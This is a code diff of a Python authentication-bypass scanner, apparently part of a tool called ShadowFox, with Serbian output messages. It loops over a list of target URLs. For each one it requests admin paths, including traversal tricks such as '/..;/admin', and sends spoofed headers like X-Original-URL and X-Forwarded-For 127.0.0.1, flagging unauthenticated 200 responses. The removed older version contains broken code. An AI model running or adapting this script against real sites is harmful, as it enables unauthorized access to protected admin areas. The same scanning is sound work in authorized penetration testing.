@@ -1,44 +1,61 @@
 import requests
-from utils.log_utils import log_to_sheet, classify_severity
+import sys
+import os
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-# Primeri zaštićenih putanja koje često zahtevaju autentifikaciju
-PROTECTED_PATHS = [
-    "/admin",
-    "/dashboard",
-    "/config",
-    "/controlpanel",
-    "/secret"
-]
+from log_to_text import log_to_text
+from tools.auto_add_severity import classify_severity
+from logics.fuzz_ai_trigger import ai_trigger_if_needed
 
-def check_auth_bypass(domain):
+def test_auth_bypass(url):
+    paths = [
+        "/admin", "/admin.php", "/admin/login", "/dashboard", "/private",
+        "/..;/admin", "/%2e%2e/admin", "/admin?access=1", "/panel"
+    ]
+
     headers_list = [
-        {},  # Bez header-a
         {"X-Original-URL": "/admin"},
         {"X-Custom-IP-Authorization": "127.0.0.1"},
         {"X-Forwarded-For": "127.0.0.1"},
-        {"Referer": "127.0.0.1"}
+        {"X-Remote-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Forwarded-Host": "127.0.0.1"}
     ]
 
-    for path in PROTECTED_PATHS:
-        for headers in headers_list:
-            url = f"{domain.rstrip('/')}{path}"
-            try:
-                r = requests.get(url, headers=headers, timeout=5)
-                if r.status_code == 200:
-                    msg = f"[!] Mogući AUTH BYPASS detektovan: {url} sa header-ima {headers}"
-                    print(msg)
-                    severity = classify_severity(msg)
-                    log_to_sheet(__file__, msg) + f' | Severity: {{severity}}')
-            except Exception as e:
-                print(f"[-] Greška: {e}")
+    user_agent = {"User-Agent": "ShadowFox-AuthBypass"}
 
-def run_auth_bypass():
-    with open("targets/targets.txt", "r") as f:
-        targets = [line.strip() for line in f if line.strip()]
+    for path in paths:
+        test_url = url.rstrip("/") + path
+        try:
+            r = requests.get(test_url, headers=user_agent, timeout=6)
+            if r.status_code == 200 and "login" not in r.text.lower():
+                log_to_text(f"[AUTH-BYPASS] {test_url} (no headers)")
+                severity = classify_severity(r.text)
+                ai_trigger_if_needed("Auth Bypass", test_url, "No headers", r.text, severity)
+                print(f"[+] Mogući auth bypass: {test_url}")
+        
+        except Exception as e:
+            print(f"[-] Greška: {e}")
 
-    for domain in targets:
-        print(f"[~] Pokušaj AUTH BYPASS za: {domain}")
-        check_auth_bypass(domain)
+    for custom_headers in headers_list:
+        headers = {**user_agent, **custom_headers}
+        try:
+            r = requests.get(url, headers=headers, timeout=6)
+            if r.status_code == 200 and "login" not in r.text.lower():
+                log_to_text(f"[AUTH-BYPASS] {url} -> Header: {custom_headers}")
+                severity = classify_severity(r.text)
+                ai_trigger_if_needed("Auth Bypass", url, str(custom_headers), r.text, severity)
+                print(f"[+] Auth bypass sa headerom: {custom_headers}")
+        
+        except Exception as e:
+            print(f"[-] Greška: {e}")
+
+    print("[-] Auth bypass testiranje završeno.")
+    return None
 
 if __name__ == "__main__":
-    run_auth_bypass()
+    with open("targets/targets.txt", "r") as f:
+        targets = f.read().splitlines()
+    
+    for url in targets:
+        test_auth_bypass(url)
